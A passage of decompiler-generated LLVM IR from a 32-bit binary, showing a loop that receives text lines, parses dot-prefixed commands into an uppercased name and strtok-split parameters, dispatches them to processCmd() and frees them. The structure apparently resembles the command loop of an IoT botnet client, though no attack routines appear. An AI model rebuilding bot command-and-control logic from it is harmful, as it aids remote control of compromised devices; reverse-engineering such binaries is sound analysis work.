  %v0_804944349.in = phi i32 [ %v0_80495ca, %dec_label_pc_80495bc ], [ %v0_8049450, %dec_label_pc_8049431 ]
  %stack_var_-56.1 = phi i32 [ %v1_8049531, %dec_label_pc_80495bc ], [ %stack_var_-56.2, %dec_label_pc_8049431 ]
  br label %dec_label_pc_80495d8

dec_label_pc_80495d8:                             ; preds = %dec_label_pc_80495d8.preheader, %dec_label_pc_80495d5
  %v0_8049443.in = phi i32 [ %v0_804944349.in, %dec_label_pc_80495d5 ], [ %v0_80498d7, %dec_label_pc_80495d8.preheader ]
  %stack_var_-56.2 = phi i32 [ %stack_var_-56.1, %dec_label_pc_80495d5 ], [ %stack_var_-56.3, %dec_label_pc_80495d8.preheader ]
  %storemerge22 = phi i32 [ %.pre, %dec_label_pc_80495d5 ], [ 0, %dec_label_pc_80495d8.preheader ]
  %v2_80495e3 = ashr i32 %storemerge22, 31
  %v0_80495ec = load i32, i32* @global_var_8052300.16, align 256
  store i32 %v0_80495ec, i32* %eax.global-to-local, align 4
  %v0_80495f1 = load i32, i32* @global_var_8052304.17, align 4
  store i32 %v0_80495f1, i32* %edx.global-to-local, align 4
  %v10_8049609 = icmp ult i32 %v2_80495e3, %v0_80495f1
  br i1 %v10_8049609, label %dec_label_pc_8049431, label %dec_label_pc_8049615

dec_label_pc_8049615:                             ; preds = %dec_label_pc_80495d8
  store i32 %v0_80495f1, i32* @ebx, align 4
  %v6_8049621 = icmp ugt i32 %v2_80495e3, %v0_80495f1
  br i1 %v6_8049621, label %dec_label_pc_8049635, label %dec_label_pc_8049623

dec_label_pc_8049623:                             ; preds = %dec_label_pc_8049615
  store i32 %v0_80495ec, i32* @edi, align 4
  %v10_8049629 = icmp ult i32 %storemerge22, %v0_80495ec
  br i1 %v10_8049629, label %dec_label_pc_8049431, label %dec_label_pc_8049635

dec_label_pc_8049635:                             ; preds = %dec_label_pc_8049623, %dec_label_pc_8049615
  %v0_8049638 = load i32, i32* @ebp, align 4
  %v2_8049638 = add i32 %v0_80498d2, -4276
  %v3_8049638 = add i32 %v2_8049638, %v0_8049638
  %v4_8049638 = inttoptr i32 %v3_8049638 to i8*
  store i8 0, i8* %v4_8049638, align 1
  store i32 %v2_80498bc, i32* %eax.global-to-local, align 4
  %v1_8049646 = load i32, i32* @esp, align 4
  %v2_8049646 = add i32 %v1_8049646, -4
  %v3_8049646 = inttoptr i32 %v2_8049646 to i32*
  store i32 %v2_80498bc, i32* %v3_8049646, align 4
  %v0_8049647 = call i32 @trim()
  %v0_804964c = load i32, i32* @esp, align 4
  %v1_804964c = add i32 %v0_804964c, 4
  %v2_804965b = load i8, i8* %tmp108, align 4
  %v3_804965b = zext i8 %v2_804965b to i32
  %v6_804965b = or i32 %v3_804965b, %v5_804965b
  store i32 %v6_804965b, i32* %eax.global-to-local, align 4
  %v10_804965d = icmp eq i8 %v2_804965b, 46
  %v1_804965f = icmp eq i1 %v10_804965d, false
  br i1 %v1_804965f, label %dec_label_pc_80498bc, label %dec_label_pc_8049665

dec_label_pc_8049665:                             ; preds = %dec_label_pc_8049635
  store i32 %v1_8049668, i32* %eax.global-to-local, align 4
  %v2_8049674113 = load i8, i8* %v5_804969a, align 1
  %v3_8049674114 = zext i8 %v2_8049674113 to i32
  %v6_8049674116 = or i32 %v3_8049674114, %v5_804965b
  store i32 %v6_8049674116, i32* %eax.global-to-local, align 4
  %v7_8049676118 = icmp eq i8 %v2_8049674113, 32
  br i1 %v7_8049676118, label %dec_label_pc_8049683, label %dec_label_pc_804967a

dec_label_pc_804966e:                             ; preds = %dec_label_pc_804967a
  %v5_804966e = add i32 %storemerge21.in119, 1
  %storemerge21 = inttoptr i32 %v5_804966e to i8*
  store i32 %v5_804966e, i32* %eax.global-to-local, align 4
  %v2_8049674 = load i8, i8* %storemerge21, align 1
  %v3_8049674 = zext i8 %v2_8049674 to i32
  %v5_8049674 = and i32 %v5_804966e, -256
  %v6_8049674 = or i32 %v3_8049674, %v5_8049674
  store i32 %v6_8049674, i32* %eax.global-to-local, align 4
  %v7_8049676 = icmp eq i8 %v2_8049674, 32
  br i1 %v7_8049676, label %dec_label_pc_8049683, label %dec_label_pc_804967a

dec_label_pc_804967a:                             ; preds = %dec_label_pc_8049665, %dec_label_pc_804966e
  %v5_8049674121 = phi i32 [ %v5_8049674, %dec_label_pc_804966e ], [ %v5_804965b, %dec_label_pc_8049665 ]
  %storemerge21120 = phi i8* [ %storemerge21, %dec_label_pc_804966e ], [ %v5_804969a, %dec_label_pc_8049665 ]
  %storemerge21.in119 = phi i32 [ %v5_804966e, %dec_label_pc_804966e ], [ %v1_8049668, %dec_label_pc_8049665 ]
  store i32 %storemerge21.in119, i32* %eax.global-to-local, align 4
  %v2_804967d = load i8, i8* %storemerge21120, align 1
  %v3_804967d = zext i8 %v2_804967d to i32
  %v6_804967d = or i32 %v3_804967d, %v5_8049674121
  store i32 %v6_804967d, i32* %eax.global-to-local, align 4
  %v4_804967f = icmp eq i8 %v2_804967d, 0
  %v1_8049681 = icmp eq i1 %v4_804967f, false
  br i1 %v1_8049681, label %dec_label_pc_804966e, label %dec_label_pc_8049683

dec_label_pc_8049683:                             ; preds = %dec_label_pc_804966e, %dec_label_pc_804967a, %dec_label_pc_8049665
  %storemerge21.in.lcssa = phi i32 [ %v1_8049668, %dec_label_pc_8049665 ], [ %storemerge21.in119, %dec_label_pc_804967a ], [ %v5_804966e, %dec_label_pc_804966e ]
  %storemerge21.lcssa = phi i8* [ %v5_804969a, %dec_label_pc_8049665 ], [ %storemerge21120, %dec_label_pc_804967a ], [ %storemerge21, %dec_label_pc_804966e ]
  %v5_8049674.lcssa = phi i32 [ %v5_804965b, %dec_label_pc_8049665 ], [ %v5_8049674121, %dec_label_pc_804967a ], [ %v5_8049674, %dec_label_pc_804966e ]
  store i32 %storemerge21.in.lcssa, i32* %eax.global-to-local, align 4
  %v2_8049686 = load i8, i8* %storemerge21.lcssa, align 1
  %v3_8049686 = zext i8 %v2_8049686 to i32
  %v6_8049686 = or i32 %v3_8049686, %v5_8049674.lcssa
  store i32 %v6_8049686, i32* %eax.global-to-local, align 4
  %v4_8049688 = icmp eq i8 %v2_8049686, 0
  br i1 %v4_8049688, label %dec_label_pc_80498bc, label %dec_label_pc_8049690

dec_label_pc_8049690:                             ; preds = %dec_label_pc_8049683
  store i8 0, i8* %storemerge21.lcssa, align 1
  store i32 %v5_804965b, i32* %eax.global-to-local, align 4
  %v3_80496b4 = call i32 @_strlen(i8* %v5_804969a)
  %v6_80496bb = add i32 %v2_80498bc, %v3_80496b4
  %v1_80496be = add i32 %v6_80496bb, 2
  store i32 %v1_80496be, i32* %eax.global-to-local, align 4
  %v5_80496c1 = inttoptr i32 %v1_80496be to i8*
  %v1_80496f9 = and i32 %v1_80496be, -256
  br label %dec_label_pc_80496eb

dec_label_pc_80496c6:                             ; preds = %dec_label_pc_8049713, %dec_label_pc_80496eb
  store i32 %v1_80496f9, i32* %eax.global-to-local, align 4
  %v3_80496dd = call i32 @_strlen(i8* %v5_80496c1)
  %v6_80496e4 = add i32 %v1_80496be, %v3_80496dd
  %v1_80496e7 = add i32 %v6_80496e4, -1
  store i32 %v1_80496e7, i32* %eax.global-to-local, align 4
  %v1_80496e8 = inttoptr i32 %v1_80496e7 to i8*
  store i8 0, i8* %v1_80496e8, align 1
  br label %dec_label_pc_80496eb

dec_label_pc_80496eb:                             ; preds = %dec_label_pc_8049690, %dec_label_pc_80496c6
  store i32 %v1_80496f9, i32* %eax.global-to-local, align 4
  %v3_8049702 = call i32 @_strlen(i8* %v5_80496c1)
  %v6_8049709 = add i32 %v1_80496be, %v3_8049702
  %v1_804970c = add i32 %v6_8049709, -1
  store i32 %v1_804970c, i32* %eax.global-to-local, align 4
  %v1_804970d = inttoptr i32 %v1_804970c to i8*
  %v2_804970d = load i8, i8* %v1_804970d, align 1
  %v3_804970d = zext i8 %v2_804970d to i32
  %v5_804970d = and i32 %v1_804970c, -256
  %v6_804970d = or i32 %v3_804970d, %v5_804970d
  store i32 %v6_804970d, i32* %eax.global-to-local, align 4
  %v10_804970f = icmp eq i8 %v2_804970d, 10
  br i1 %v10_804970f, label %dec_label_pc_80496c6, label %dec_label_pc_8049713

dec_label_pc_8049713:                             ; preds = %dec_label_pc_80496eb
  store i32 %v1_80496f9, i32* %eax.global-to-local, align 4
  store i32 %v1_80496be, i32* @edi, align 4
  %v3_804972a = call i32 @_strlen(i8* %v5_80496c1)
  %v4_804972a = mul i32 %v3_804972a, -1
  %v5_804972a = add i32 %v4_804972a, -2
  store i32 %v5_804972a, i32* @ecx, align 4
  %v6_8049731 = sub i32 %v1_80496be, %v4_804972a
  %v1_8049734 = add i32 %v6_8049731, -1
  store i32 %v1_8049734, i32* %eax.global-to-local, align 4
  %v1_8049735 = inttoptr i32 %v1_8049734 to i8*
  %v2_8049735 = load i8, i8* %v1_8049735, align 1
  %v3_8049735 = zext i8 %v2_8049735 to i32
  %v5_8049735 = and i32 %v1_8049734, -256
  %v6_8049735 = or i32 %v3_8049735, %v5_8049735
  store i32 %v6_8049735, i32* %eax.global-to-local, align 4
  %v10_8049737 = icmp eq i8 %v2_8049735, 13
  br i1 %v10_8049737, label %dec_label_pc_80496c6, label %dec_label_pc_804973b

dec_label_pc_804973b:                             ; preds = %dec_label_pc_8049713
  store i32 %v1_80496be, i32* %eax.global-to-local, align 4
  %v2_8049749128 = load i8, i8* %v5_80496c1, align 1
  %v3_8049749129 = zext i8 %v2_8049749128 to i32
  %v6_8049749131 = or i32 %v3_8049749129, %v1_80496f9
  store i32 %v6_8049749131, i32* %eax.global-to-local, align 4
  %v7_804974b133 = icmp eq i8 %v2_8049749128, 32
  br i1 %v7_804974b133, label %dec_label_pc_8049758, label %dec_label_pc_804974f

dec_label_pc_8049743:                             ; preds = %dec_label_pc_804974f
  %v5_8049743 = add i32 %v4_8049746135, 1
  %v22_8049743 = inttoptr i32 %v5_8049743 to i8*
  store i32 %v5_8049743, i32* %eax.global-to-local, align 4
  %v2_8049749 = load i8, i8* %v22_8049743, align 1
  %v3_8049749 = zext i8 %v2_8049749 to i32
  %v5_8049749 = and i32 %v5_8049743, -256
  %v6_8049749 = or i32 %v3_8049749, %v5_8049749
  store i32 %v6_8049749, i32* %eax.global-to-local, align 4
  %v7_804974b = icmp eq i8 %v2_8049749, 32
  br i1 %v7_804974b, label %dec_label_pc_8049758, label %dec_label_pc_804974f

dec_label_pc_804974f:                             ; preds = %dec_label_pc_804973b, %dec_label_pc_8049743
  %v5_8049749136 = phi i32 [ %v5_8049749, %dec_label_pc_8049743 ], [ %v1_80496f9, %dec_label_pc_804973b ]
  %v4_8049746135 = phi i32 [ %v5_8049743, %dec_label_pc_8049743 ], [ %v1_80496be, %dec_label_pc_804973b ]
  %stack_var_-60.1134 = phi i8* [ %v22_8049743, %dec_label_pc_8049743 ], [ %v5_80496c1, %dec_label_pc_804973b ]
  store i32 %v4_8049746135, i32* %eax.global-to-local, align 4
  %v2_8049752 = load i8, i8* %stack_var_-60.1134, align 1
  %v3_8049752 = zext i8 %v2_8049752 to i32
  %v6_8049752 = or i32 %v3_8049752, %v5_8049749136
  store i32 %v6_8049752, i32* %eax.global-to-local, align 4
  %v4_8049754 = icmp eq i8 %v2_8049752, 0
  %v1_8049756 = icmp eq i1 %v4_8049754, false
  br i1 %v1_8049756, label %dec_label_pc_8049743, label %dec_label_pc_8049758

dec_label_pc_8049758:                             ; preds = %dec_label_pc_8049743, %dec_label_pc_804974f, %dec_label_pc_804973b
  %stack_var_-60.1.lcssa = phi i8* [ %v5_80496c1, %dec_label_pc_804973b ], [ %stack_var_-60.1134, %dec_label_pc_804974f ], [ %v22_8049743, %dec_label_pc_8049743 ]
  %v4_8049746.lcssa = phi i32 [ %v1_80496be, %dec_label_pc_804973b ], [ %v4_8049746135, %dec_label_pc_804974f ], [ %v5_8049743, %dec_label_pc_8049743 ]
  store i8 0, i8* %stack_var_-60.1.lcssa, align 1
  %v5_804975e = add i32 %v4_8049746.lcssa, 1
  store i32 %v1_80496be, i32* %eax.global-to-local, align 4
  %v2_804978c142 = load i8, i8* %v5_80496c1, align 1
  %v3_804978c143 = zext i8 %v2_804978c142 to i32
  %v6_804978c145 = or i32 %v3_804978c143, %v1_80496f9
  store i32 %v6_804978c145, i32* %eax.global-to-local, align 4
  %v4_804978e146 = icmp eq i8 %v2_804978c142, 0
  %v1_8049790147 = icmp eq i1 %v4_804978e146, false
  br i1 %v1_8049790147, label %dec_label_pc_8049769, label %dec_label_pc_8049792

dec_label_pc_8049769:                             ; preds = %dec_label_pc_8049758, %dec_label_pc_8049769
  %storemerge20149 = phi i8* [ %storemerge20, %dec_label_pc_8049769 ], [ %v5_80496c1, %dec_label_pc_8049758 ]
  %storemerge20.in148 = phi i32 [ %v5_8049786, %dec_label_pc_8049769 ], [ %v1_80496be, %dec_label_pc_8049758 ]
  store i32 %storemerge20.in148, i32* %eax.global-to-local, align 4
  %v2_804976c = load i8, i8* %storemerge20149, align 1
  %v3_804976c = zext i8 %v2_804976c to i32
  store i32 %v3_804976c, i32* %eax.global-to-local, align 4
  %v0_8049773 = load i32, i32* @esp, align 4
  %v2_8049776 = add i32 %v0_8049773, -16
  %v3_8049776 = inttoptr i32 %v2_8049776 to i32*
  store i32 %v3_804976c, i32* %v3_8049776, align 4
  %v0_8049777 = call i32 @__GI_toupper()
  %v1_804977f = urem i32 %v0_8049777, 256
  %v2_804977f = load i32, i32* @edx, align 4
  %v3_804977f = and i32 %v2_804977f, -256
  %v4_804977f = or i32 %v3_804977f, %v1_804977f
  store i32 %v4_804977f, i32* @edx, align 4
  %v1_8049784 = trunc i32 %v0_8049777 to i8
  store i8 %v1_8049784, i8* %storemerge20149, align 1
  %v5_8049786 = add i32 %storemerge20.in148, 1
  %storemerge20 = inttoptr i32 %v5_8049786 to i8*
  store i32 %v5_8049786, i32* %eax.global-to-local, align 4
  %v2_804978c = load i8, i8* %storemerge20, align 1
  %v3_804978c = zext i8 %v2_804978c to i32
  %v5_804978c = and i32 %v5_8049786, -256
  %v6_804978c = or i32 %v3_804978c, %v5_804978c
  store i32 %v6_804978c, i32* %eax.global-to-local, align 4
  %v4_804978e = icmp eq i8 %v2_804978c, 0
  %v1_8049790 = icmp eq i1 %v4_804978e, false
  br i1 %v1_8049790, label %dec_label_pc_8049769, label %dec_label_pc_8049792

dec_label_pc_8049792:                             ; preds = %dec_label_pc_8049769, %dec_label_pc_8049758
  %v22_804975e = inttoptr i32 %v5_804975e to i8*
  store i32 %v5_804975e, i32* @eax, align 4
  %v0_804979c = load i32, i32* @esp, align 4
  %v1_804979f = add i32 %v0_804979c, -12
  %v2_804979f = inttoptr i32 %v1_804979f to i32*
  store i32 ptrtoint (i32* @global_var_804fd3b.26 to i32), i32* %v2_804979f, align 4
  %v0_80497a4 = load i32, i32* @eax, align 4
  %v2_80497a4 = add i32 %v0_804979c, -16
  %v3_80497a4 = inttoptr i32 %v2_80497a4 to i32*
  store i32 %v0_80497a4, i32* %v3_80497a4, align 4
  %v1_80497a5 = load i8*, i8** %stack_var_-32, align 4
  %v2_80497a5 = ptrtoint i8* %v1_80497a5 to i32
  %v3_80497a5 = call i32 @__GI_strtok(i32 1, i32 %v2_80497a5)
  %v0_80497aa = load i32, i32* @esp, align 4
  %v1_80497aa = add i32 %v0_80497aa, 16
  %v5_80497ad = inttoptr i32 %v3_80497a5 to i8*
  store i8* %v5_80497ad, i8** %stack_var_-32, align 4
  store i32 %v1_80496be, i32* %eax.global-to-local, align 4
  store i32 %v1_80496be, i32* %stack_var_-188, align 4
  %v5_804986627 = icmp eq i32 %v3_80497a5, 0
  %v1_804986a34 = icmp eq i1 %v5_804986627, false
  br i1 %v1_804986a34, label %dec_label_pc_80497be, label %dec_label_pc_8049870

dec_label_pc_80497be:                             ; preds = %dec_label_pc_8049792, %dec_label_pc_8049851
  %v0_804985144 = phi i32 [ %v1_8049860, %dec_label_pc_8049851 ], [ %v1_80497aa, %dec_label_pc_8049792 ]
  %v3_80497ce = phi i8* [ %tmp111, %dec_label_pc_8049851 ], [ %v5_80497ad, %dec_label_pc_8049792 ]
  %stack_var_-36.135 = phi i32 [ %stack_var_-36.0, %dec_label_pc_8049851 ], [ 1, %dec_label_pc_8049792 ]
  %v4_80497be = ptrtoint i8* %v3_80497ce to i32
  store i32 %v4_80497be, i32* %eax.global-to-local, align 4
  %v2_80497c1 = load i8, i8* %v3_80497ce, align 1
  %v3_80497c1 = zext i8 %v2_80497c1 to i32
  %v5_80497c1 = and i32 %v4_80497be, -256
  %v6_80497c1 = or i32 %v3_80497c1, %v5_80497c1
  store i32 %v6_80497c1, i32* @eax, align 4
  %v10_80497c3 = icmp eq i8 %v2_80497c1, 10
  br i1 %v10_80497c3, label %dec_label_pc_8049851, label %dec_label_pc_80497cb

dec_label_pc_80497cb:                             ; preds = %dec_label_pc_80497be
  store i32 %stack_var_-36.135, i32* @ebx, align 4
  store i32 %v5_80497c1, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_80497be, i32* @edi, align 4
  %v3_80497e5 = call i32 @_strlen(i8* %v3_80497ce)
  %v1_80497e9 = add i32 %v3_80497e5, 1
  store i32 %v1_80497e9, i32* %eax.global-to-local, align 4
  %v0_80497ed = load i32, i32* @esp, align 4
  %v2_80497f0 = add i32 %v0_80497ed, -16
  %v3_80497f0 = inttoptr i32 %v2_80497f0 to i32*
  store i32 %v1_80497e9, i32* %v3_80497f0, align 4
  %v2_80497f1 = call i32 @malloc(i32 %v4_80497be)
  %v1_80497f9 = load i32, i32* @ebp, align 4
  %v2_80497f9 = load i32, i32* @ebx, align 4
  %v3_80497f9 = mul i32 %v2_80497f9, 4
  %v4_80497f9 = add i32 %v1_80497f9, -180
  %v5_80497f9 = add i32 %v4_80497f9, %v3_80497f9
  %v6_80497f9 = inttoptr i32 %v5_80497f9 to i32*
  store i32 %v2_80497f1, i32* %v6_80497f9, align 4
  %v3_8049800 = load i8*, i8** %stack_var_-32, align 4
  %v4_8049800 = ptrtoint i8* %v3_8049800 to i32
  %v1_804980e = and i32 %v4_8049800, -256
  store i32 %v1_804980e, i32* %eax.global-to-local, align 4
  %v3_8049817 = call i32 @_strlen(i8* %v3_8049800)
  %v1_804981b = add i32 %v3_8049817, 1
  store i32 %v1_804981b, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-36.135, i32* %eax.global-to-local, align 4
  %v0_8049824 = load i32, i32* @ebp, align 4
  %v2_8049824 = mul i32 %stack_var_-36.135, 4
  %v3_8049824 = add i32 %v2_8049824, -180
  %v4_8049824 = add i32 %v0_8049824, %v3_8049824
  %v5_8049824 = inttoptr i32 %v4_8049824 to i32*
  %v6_8049824 = load i32, i32* %v5_8049824, align 4
  %v1_804982b = inttoptr i32 %v6_8049824 to i8*
  store i32 %v6_8049824, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8049830 = and i32 %v6_8049824, -256
  store i32 %v1_8049830, i32* %eax.global-to-local, align 4
  %v5_8049832 = call i8* @_memset(i8* %v1_804982b, i32 %v1_8049830, i32 %v1_804981b)
  %v6_8049832 = ptrtoint i8* %v5_8049832 to i32
  store i32 %v6_8049832, i32* @ecx, align 4
  store i32 %v4_8049800, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-36.135, i32* %eax.global-to-local, align 4
  %v0_804983a = load i32, i32* @ebp, align 4
  %v4_804983a = add i32 %v0_804983a, %v3_8049824
  %v5_804983a = inttoptr i32 %v4_804983a to i32*
  %v6_804983a = load i32, i32* %v5_804983a, align 4
  store i32 %v6_804983a, i32* @eax, align 4
  %v0_8049841 = load i32, i32* @esp, align 4
  %v2_8049844 = add i32 %v0_8049841, -12
  %v3_8049844 = inttoptr i32 %v2_8049844 to i32*
  store i32 %v4_8049800, i32* %v3_8049844, align 4
  %v0_8049845 = load i32, i32* @eax, align 4
  %v2_8049845 = add i32 %v0_8049841, -16
  %v3_8049845 = inttoptr i32 %v2_8049845 to i32*
  store i32 %v0_8049845, i32* %v3_8049845, align 4
  %v5_8049846 = call i32 @strcpy(i8* %v3_8049800, i32 %v4_80497be)
  store i32 %v5_8049846, i32* @eax, align 4
  %v0_804984b = load i32, i32* @esp, align 4
  %v1_804984b = add i32 %v0_804984b, 16
  %v4_804984e = add i32 %stack_var_-36.135, 1
  br label %dec_label_pc_8049851

dec_label_pc_8049851:                             ; preds = %dec_label_pc_80497be, %dec_label_pc_80497cb
  %v0_8049851 = phi i32 [ %v0_804985144, %dec_label_pc_80497be ], [ %v1_804984b, %dec_label_pc_80497cb ]
  %stack_var_-36.0 = phi i32 [ %stack_var_-36.135, %dec_label_pc_80497be ], [ %v4_804984e, %dec_label_pc_80497cb ]
  %v1_8049854 = add i32 %v0_8049851, -12
  %v2_8049854 = inttoptr i32 %v1_8049854 to i32*
  store i32 ptrtoint (i32* @global_var_804fd3b.26 to i32), i32* %v2_8049854, align 4
  %v1_8049859 = add i32 %v0_8049851, -16
  %v2_8049859 = inttoptr i32 %v1_8049859 to i32*
  store i32 0, i32* %v2_8049859, align 4
  %v1_804985b = load i8*, i8** %stack_var_-32, align 4
  %v2_804985b = ptrtoint i8* %v1_804985b to i32
  %v3_804985b = call i32 @__GI_strtok(i32 %stack_var_-36.0, i32 %v2_804985b)
  store i32 %v3_804985b, i32* %eax.global-to-local, align 4
  %v0_8049860 = load i32, i32* @esp, align 4
  %v1_8049860 = add i32 %v0_8049860, 16
  store i32 %v3_804985b, i32* %tmp109, align 4
  %v5_8049866 = icmp eq i32 %v3_804985b, 0
  %v1_804986a = icmp eq i1 %v5_8049866, false
  %tmp111 = inttoptr i32 %v3_804985b to i8*
  br i1 %v1_804986a, label %dec_label_pc_80497be, label %dec_label_pc_8049870

dec_label_pc_8049870:                             ; preds = %dec_label_pc_8049851, %dec_label_pc_8049792
  %v0_8049870 = phi i32 [ %v1_80497aa, %dec_label_pc_8049792 ], [ %v1_8049860, %dec_label_pc_8049851 ]
  %stack_var_-36.1.lcssa = phi i32 [ 1, %dec_label_pc_8049792 ], [ %stack_var_-36.0, %dec_label_pc_8049851 ]
  store i32 %v2_8049873, i32* %eax.global-to-local, align 4
  %v2_8049879 = add i32 %v0_8049870, -12
  %v3_8049879 = inttoptr i32 %v2_8049879 to i32*
  store i32 %v2_8049873, i32* %v3_8049879, align 4
  %v5_804987a = add i32 %v0_8049870, -16
  %v6_804987a = inttoptr i32 %v5_804987a to i32*
  store i32 %stack_var_-36.1.lcssa, i32* %v6_804987a, align 4
  %v0_804987d = call i32 @processCmd()
  store i32 %v0_804987d, i32* %eax.global-to-local, align 4
  %v0_8049882 = load i32, i32* @esp, align 4
  %v1_8049882 = add i32 %v0_8049882, 16
  %v7_8049889 = icmp sgt i32 %stack_var_-36.1.lcssa, 1
  br i1 %v7_8049889, label %dec_label_pc_804989b.lr.ph, label %dec_label_pc_80498bc

dec_label_pc_804989b.lr.ph:                       ; preds = %dec_label_pc_8049870
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804989b

dec_label_pc_804989b:                             ; preds = %dec_label_pc_804989b.lr.ph, %dec_label_pc_804989b
  %storemerge153 = phi i32 [ 1, %dec_label_pc_804989b.lr.ph ], [ %v4_80498b1, %dec_label_pc_804989b ]
  %v0_80498a5152 = phi i32 [ %v1_8049882, %dec_label_pc_804989b.lr.ph ], [ %v1_80498ae, %dec_label_pc_804989b ]
  store i32 %storemerge153, i32* %eax.global-to-local, align 4
  %v0_804989e = load i32, i32* @ebp, align 4
  %v2_804989e = mul i32 %storemerge153, 4
  %v3_804989e = add i32 %v2_804989e, -180
  %v4_804989e = add i32 %v3_804989e, %v0_804989e
  %v5_804989e = inttoptr i32 %v4_804989e to i32*
  %v6_804989e = load i32, i32* %v5_804989e, align 4
  store i32 %v6_804989e, i32* %eax.global-to-local, align 4
  %v2_80498a8 = add i32 %v0_80498a5152, -16
  %v3_80498a8 = inttoptr i32 %v2_80498a8 to i32*
  store i32 %v6_804989e, i32* %v3_80498a8, align 4
  %v1_80498a9 = call i32 @free(i32 %storemerge153)
  %v0_80498ae = load i32, i32* @esp, align 4
  %v1_80498ae = add i32 %v0_80498ae, 16
  %v4_80498b1 = add nuw i32 %storemerge153, 1
  store i32 %v4_80498b1, i32* %eax.global-to-local, align 4
  %v15_80498b7 = icmp eq i32 %v4_80498b1, %stack_var_-36.1.lcssa
  br i1 %v15_80498b7, label %dec_label_pc_80498bc, label %dec_label_pc_804989b

dec_label_pc_80498bc:                             ; preds = %dec_label_pc_804989b, %dec_label_pc_8049870, %dec_label_pc_8049683, %dec_label_pc_8049635, %dec_label_pc_80498bc.preheader
  %v0_80498c8 = phi i32 [ %v0_80498c8.pre, %dec_label_pc_80498bc.preheader ], [ %v1_804964c, %dec_label_pc_8049635 ], [ %v1_804964c, %dec_label_pc_8049683 ], [ %v1_8049882, %dec_label_pc_8049870 ], [ %v1_80498ae, %dec_label_pc_804989b ]
  %stack_var_-60.2 = phi i8* [ %stack_var_-60.0.ph, %dec_label_pc_80498bc.preheader ], [ %tmp108, %dec_label_pc_8049635 ], [ %tmp108, %dec_label_pc_8049683 ], [ %v22_804975e, %dec_label_pc_8049870 ], [ %v22_804975e, %dec_label_pc_804989b ]
  %stack_var_-56.3 = phi i32 [ %stack_var_-56.0.ph, %dec_label_pc_80498bc.preheader ], [ %stack_var_-56.2, %dec_label_pc_8049635 ], [ %stack_var_-56.2, %dec_label_pc_8049683 ], [ %stack_var_-56.2, %dec_label_pc_8049870 ], [ %stack_var_-56.2, %dec_label_pc_804989b ]
  store i32 %v2_80498bc, i32* %eax.global-to-local, align 4
  %v0_80498c2 = load i32, i32* @global_var_8052308.15, align 8
  store i32 %v0_80498c2, i32* %edx.global-to-local, align 4
  %v1_80498cb = add i32 %v0_80498c8, -8
  %v2_80498cb = inttoptr i32 %v1_80498cb to i32*
  store i32 4096, i32* %v2_80498cb, align 4
  %v2_80498d0 = add i32 %v0_80498c8, -12
  %v3_80498d0 = inttoptr i32 %v2_80498d0 to i32*
  store i32 %v2_80498bc, i32* %v3_80498d0, align 4
  %v0_80498d1 = load i32, i32* %edx.global-to-local, align 4
  %v2_80498d1 = add i32 %v0_80498c8, -16
  %v3_80498d1 = inttoptr i32 %v2_80498d1 to i32*
  store i32 %v0_80498d1, i32* %v3_80498d1, align 4
  %v0_80498d2 = call i32 @recvLine()
  store i32 %v0_80498d2, i32* %eax.global-to-local, align 4
  %v13_80498dd = icmp eq i32 %v0_80498d2, -1
  %v1_80498e1 = icmp eq i1 %v13_80498dd, false
  br i1 %v1_80498e1, label %dec_label_pc_80495d8.preheader, label %dec_label_pc_8049409.outer

dec_label_pc_80495d8.preheader:                   ; preds = %dec_label_pc_80498bc
  %v0_80498d7 = load i32, i32* @esp, align 4
  %v2_804944b = ptrtoint i8* %stack_var_-60.2 to i32
  br label %dec_label_pc_80495d8

; uselistorder directives
  uselistorder i32 %v0_80498d2, { 0, 2, 1 }
  uselistorder i8* %stack_var_-60.2, { 1, 0 }
  uselistorder i32 %v0_80498c8, { 2, 1, 0 }
  uselistorder i32 %v4_80498b1, { 1, 0, 2 }
  uselistorder i32 %storemerge153, { 3, 2, 0, 1 }
  uselistorder i32 %stack_var_-36.1.lcssa, { 0, 2, 1 }
  uselistorder i32 %v0_8049870, { 1, 0 }
  uselistorder i32 %v3_804985b, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-36.0, { 0, 2, 1 }
  uselistorder i32 %v0_8049851, { 1, 0 }
  uselistorder i32 %v1_804981b, { 1, 0 }
  uselistorder i32 %v1_80497e9, { 1, 0 }
  uselistorder i32 %v5_80497c1, { 1, 0 }
  uselistorder i32 %v4_80497be, { 2, 1, 0, 3, 4 }
  uselistorder i32 %stack_var_-36.135, { 0, 5, 4, 2, 3, 1 }
  uselistorder i8* %v3_80497ce, { 2, 0, 1 }
  uselistorder i32 %v1_80497aa, { 1, 0 }
  uselistorder i8* %storemerge20, { 1, 0 }
  uselistorder i32 %v5_8049786, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8049777, { 1, 0 }
  uselistorder i32 %storemerge20.in148, { 1, 0 }
  uselistorder i8* %storemerge20149, { 1, 0 }
  uselistorder i32 %v1_80496f9, { 1, 0, 2, 3, 5, 4 }
  uselistorder i8* %v5_80496c1, { 0, 3, 1, 2, 4, 5, 7, 6 }
  uselistorder i32 %v1_80496be, { 8, 7, 2, 6, 3, 4, 5, 9, 10, 1, 0, 11, 12, 13 }
  uselistorder i8* %storemerge21.lcssa, { 1, 0 }
  uselistorder i32 %v5_804966e, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_80495f1, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80495ec, { 1, 0, 2 }
  uselistorder i32 %storemerge22, { 2, 4, 0, 3, 1 }
  uselistorder i32 %stack_var_-56.2, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_8049443.in, { 2, 1, 0 }
  uselistorder i32 %v0_804957b, { 1, 0, 2 }
  uselistorder i32 %storemerge23, { 1, 0, 2 }
  uselistorder i32 %v2_8049548, { 2, 0, 1 }
  uselistorder i32 %v1_8049531, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_80494fc, { 1, 0 }
  uselistorder i32 %v0_80494a2, { 1, 0, 2 }
  uselistorder i32 %storemerge24, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8049471, { 1, 0, 2 }
  uselistorder i32 %.pre, { 0, 2, 1 }
  uselistorder i32 %v2_8049434, { 1, 0 }
  uselistorder i8* %v5_804969a, { 3, 0, 1, 2 }
  uselistorder i32 %v5_804965b, { 4, 0, 1, 2, 3 }
